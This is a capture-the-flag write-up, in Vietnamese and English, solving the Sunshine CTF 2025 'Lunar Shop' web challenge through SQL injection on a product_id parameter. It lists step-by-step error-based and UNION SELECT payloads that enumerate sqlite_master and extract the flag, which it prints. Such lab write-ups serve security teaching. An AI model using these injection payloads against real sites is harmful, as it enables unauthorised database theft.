# Sunshine CTF 2025 — Lunar Shop

---

**Thể loại:** Web

**Độ khó:** Dễ

---

## Tổng quan thử thách

Thử thách cung cấp một ứng dụng web tên là "Lunar Shop", một cửa hàng trực tuyến đơn giản. Trang web cho phép người dùng xem các sản phẩm thông qua một tham số URL, ví dụ: `/product?product_id=1`. Mô tả của thử thách có đề cập đến một "sản phẩm flag chưa được phát hành" và một cảnh báo quan trọng: "Fuzzing is NOT allowed" (Không được phép Fuzzing), điều này gợi ý rằng việc dò quét (brute-force) các ID sản phẩm không phải là hướng đi đúng.

---

## Mục tiêu

Mục tiêu chính là khai thác lỗ hổng SQL Injection trên tham số `product_id` để đọc dữ liệu từ cơ sở dữ liệu của ứng dụng, từ đó tìm và trích xuất flag ẩn.

---

## Kiến thức cần thiết

Để giải quyết thử thách này, người chơi cần có kiến thức cơ bản về:

- **Lỗ hổng SQL Injection (SQLi):** Hiểu cách một ứng dụng web có thể bị tấn công khi đầu vào của người dùng được sử dụng để xây dựng các câu truy vấn SQL một cách không an toàn.
- **Error-based SQLi:** Kỹ thuật phát hiện và xác nhận lỗ hổng bằng cách gửi các payload gây ra lỗi cú pháp SQL và quan sát phản hồi lỗi từ cơ sở dữ liệu.
- **UNION-based SQLi:** Kỹ thuật sử dụng toán tử `UNION` trong SQL để kết hợp kết quả của một câu truy vấn độc hại vào kết quả của câu truy vấn gốc, từ đó trích xuất thông tin từ các bảng khác.
- **Enumeration trong SQLite:** Biết cách truy vấn bảng hệ thống `sqlite_master` để khám phá cấu trúc của cơ sở dữ liệu, bao gồm tên bảng và tên cột.

---

## Phân tích và hướng tiếp cận

Dựa trên tham số `product_id` và cảnh báo về fuzzing, hướng tấn công rõ ràng nhất là SQL Injection. Quy trình khai thác bao gồm các bước logic để xác nhận lỗ hổng và từng bước trích xuất thông tin cần thiết.

1. **Xác nhận lỗ hổng (Error-based):**
    - Bắt đầu bằng cách chèn một dấu nháy đơn (`'`) vào cuối giá trị `product_id`.
    - **Payload:** `product_id=1'`
    - Phản hồi lỗi từ máy chủ (`unrecognized token: "';"`) xác nhận rằng tham số này có thể bị tấn công SQL Injection.
2. **Xác định số lượng cột:**
    - Sử dụng mệnh đề `ORDER BY` để đoán số lượng cột trong câu truy vấn `SELECT` gốc. Chúng ta thử với các số tăng dần cho đến khi gặp lỗi.
    - **Payload:** `product_id=1 ORDER BY 5--`
    - Phản hồi lỗi (`1st ORDER BY term out of range - should be between 1 and 4`) tiết lộ rằng câu truy vấn gốc đang lấy ra **4 cột**. Đây là thông tin quan trọng để xây dựng payload `UNION SELECT`.
3. **Tìm tên bảng (Table Enumeration):**
    - Sử dụng `UNION SELECT` với một ID không tồn tại (ví dụ: `1`) để chỉ hiển thị kết quả từ payload của chúng ta.
    - Truy vấn bảng `sqlite_master` để liệt kê tất cả các bảng trong cơ sở dữ liệu.
    - **Payload:** `product_id=-1 UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table'--`
    - Kết quả trả về cho thấy sự tồn tại của một bảng có tên là **`flag`**.
4. **Tìm tên cột (Column Enumeration):**
    - Khi đã có tên bảng, chúng ta tiếp tục truy vấn `sqlite_master` để lấy câu lệnh `CREATE TABLE` từ cột `sql`. Điều này sẽ tiết lộ cấu trúc và tên các cột của bảng `flag`.
    - **Payload:** `product_id=-1 UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE name='flag'--`
    - Kết quả cho thấy cấu trúc `CREATE TABLE flag (..., flag TEXT, ...)` , xác nhận có một cột tên là **`flag`**.
5. **Trích xuất Flag:**
    - Với tên bảng và tên cột đã biết, bước cuối cùng là truy vấn trực tiếp để lấy nội dung của cột `flag` từ bảng `flag`.
    - **Payload:** `product_id=-1 UNION SELECT 1,flag,3,4 FROM flag--`
    - Payload này sẽ hiển thị giá trị của flag ngay trên trang web.

---

## Kịch bản khai thác (Exploit Payloads)

Dưới đây là chuỗi các URL được sử dụng để khai thác lỗ hổng từng bước một.

1. **Kiểm tra lỗ hổng:**
    
    ```
    <https://meteor.sunshinectf.games/product?product_id=1>'
    ```
    
    <img width="834" height="313" alt="image" src="https://github.com/user-attachments/assets/2e523aca-844d-49b3-ba50-75083a2a976f" />

    
2. **Tìm số cột:**
    
    ```
    <https://meteor.sunshinectf.games/product?product_id=1> ORDER BY 5--
    
    ```
    
    <img width="894" height="335" alt="image" src="https://github.com/user-attachments/assets/19fe1774-44b1-4d2d-a0cd-508ac195435d" />

    
3. **Tìm tên bảng `flag`:**
    
    ```
    <https://meteor.sunshinectf.games/product?product_id=-1> UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table'--
    ```
    
    <img width="1196" height="283" alt="image" src="https://github.com/user-attachments/assets/9afc3452-df96-4c3b-96d1-7259bacf2b6a" />

    
4. **Tìm tên cột `flag`:**
    
    ```
    <https://meteor.sunshinectf.games/product?product_id=-1> UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE name='flag'--
    
    ```
    
    <img width="1196" height="283" alt="image" src="https://github.com/user-attachments/assets/9e439b4b-7699-4c1b-8d4b-8d08abcd1281" />

    
5. **Lấy flag:**
    
    ```
    <https://meteor.sunshinectf.games/product?product_id=-1> UNION SELECT 1,flag,3,4 FROM flag--
    
    ```

    <img width="1112" height="321" alt="image" src="https://github.com/user-attachments/assets/4231c0c8-b644-49f3-9164-e9975127c66f" />

   

---

**Kết quả (Flag)**

Sau khi thực hiện payload cuối cùng, flag sẽ được hiển thị trên trang.

`sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}`

---

## Ghi chú và mẹo

- Đây là một bài tập SQL Injection cổ điển, giúp người chơi thực hành quy trình khai thác từ A đến Z: phát hiện, enum và trích xuất.
- Các thông báo lỗi của máy chủ web hoặc cơ sở dữ liệu là nguồn thông tin vô giá. Trong trường hợp này, lỗi đã xác nhận lỗ hổng và tiết lộ số lượng cột.
- Cảnh báo "No Fuzzing" là một gợi ý mạnh mẽ để tìm kiếm các lỗ hổng logic hoặc injection thay vì các cuộc tấn công brute-force.
- Với các database SQLite, bảng `sqlite_master` luôn là điểm khởi đầu để khám phá cấu trúc bên trong.

---

# ENGLISH VERSION

**Category:** Web

**Difficulty:** Easy

---

## Challenge Overview

The challenge provides a web application called "Lunar Shop," a simple online store. The site allows users to view products via a URL parameter, e.g., `/product?product_id=1`. The challenge description mentions an "unreleased flag product" and includes a critical warning: "Fuzzing is NOT allowed," which suggests that brute-forcing product IDs is not the intended solution.

---

## Objective

The main objective is to exploit an SQL Injection vulnerability in the `product_id` parameter to read data from the application's database, ultimately finding and extracting the hidden flag.

---

## Required Knowledge

To solve this challenge, players need a basic understanding of:

- **SQL Injection (SQLi):** Understanding how a web application can be attacked when user input is insecurely used to construct SQL queries.
- **Error-based SQLi:** The technique of detecting and confirming a vulnerability by sending payloads that cause SQL syntax errors and observing the error responses from the database.
- **UNION-based SQLi:** The technique of using the `UNION` operator in SQL to combine the results of a malicious query with the original query's results, thereby exfiltrating information from other tables.
- **SQLite Enumeration:** Knowing how to query the `sqlite_master` system table to discover the database schema, including table and column names.

---

## Analysis and Approach

Based on the `product_id` parameter and the warning against fuzzing, the most evident attack vector is SQL Injection. The exploitation process follows a logical sequence of steps to confirm the vulnerability and incrementally extract the necessary information.

1. **Confirm the Vulnerability (Error-based):**
    - Start by injecting a single quote (`'`) at the end of the `product_id` value.
    - **Payload:** `product_id=1'`
    - The error response from the server (`unrecognized token: "';"`) confirms that the parameter is vulnerable to SQL Injection.
2. **Determine the Number of Columns:**
    - Use the `ORDER BY` clause to guess the number of columns in the original `SELECT` query. We increment the number until an error occurs.
    - **Payload:** `product_id=1 ORDER BY 5--`
    - The error response (`1st ORDER BY term out of range - should be between 1 and 4`) reveals that the original query is selecting exactly **4 columns**. This is crucial information for building a `UNION SELECT` payload.
3. **Enumerate Table Names:**
    - Use a `UNION SELECT` statement with a non-existent ID (e.g., `1`) to ensure only the results from our payload are displayed.
    - Query the `sqlite_master` table to list all tables in the database.
    - **Payload:** `product_id=-1 UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table'--`
    - The result reveals the existence of a table named **`flag`**.
4. **Enumerate Column Names:**
    - With the table name known, we query `sqlite_master` again to retrieve the `CREATE TABLE` statement from the `sql` column. This will reveal the structure and column names of the `flag` table.
    - **Payload:** `product_id=-1 UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE name='flag'--`
    - The result shows the structure `CREATE TABLE flag (..., flag TEXT, ...)` , confirming a column named **`flag`**.
5. **Extract the Flag:**
    - With both the table and column names identified, the final step is to query the table directly to retrieve the content of the `flag` column.
    - **Payload:** `product_id=-1 UNION SELECT 1,flag,3,4 FROM flag--`
    - This payload will display the flag's value directly on the web page.

---

## Exploitation Payloads

Below is the sequence of URLs used to exploit the vulnerability step-by-step.

1. **Vulnerability Check:**
    
    ```
    <https://meteor.sunshinectf.games/product?product_id=1>'
    
    ```
    
2. **Find Column Count:**
    
    ```
    <https://meteor.sunshinectf.games/product?product_id=1> ORDER BY 5--
    
    ```
    
3. **Find the `flag` Table Name:**
    
    ```
    <https://meteor.sunshinectf.games/product?product_id=-1> UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table'--
    
    ```
    
4. **Find the `flag` Column Name:**
    
    ```
    <https://meteor.sunshinectf.games/product?product_id=-1> UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE name='flag'--
    
    ```
    
5. **Retrieve the Flag:**
    
    ```
    <https://meteor.sunshinectf.games/product?product_id=-1> UNION SELECT 1,flag,3,4 FROM flag--
    
    ```
    

---

**Result (Flag)**

After executing the final payload, the flag is displayed on the page.

`sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}`

---

## Notes and Tips

- This is a classic SQL Injection exercise that allows players to practice the full exploitation workflow: detection, enumeration, and exfiltration.
- Error messages from the web server or database are an invaluable source of information. In this case, errors confirmed the vulnerability and revealed the column count.
- The "No Fuzzing" warning is a strong hint to look for logical or injection-based vulnerabilities rather than brute-force attacks.
- For SQLite databases, the `sqlite_master` table is always the starting point for discovering the internal schema.
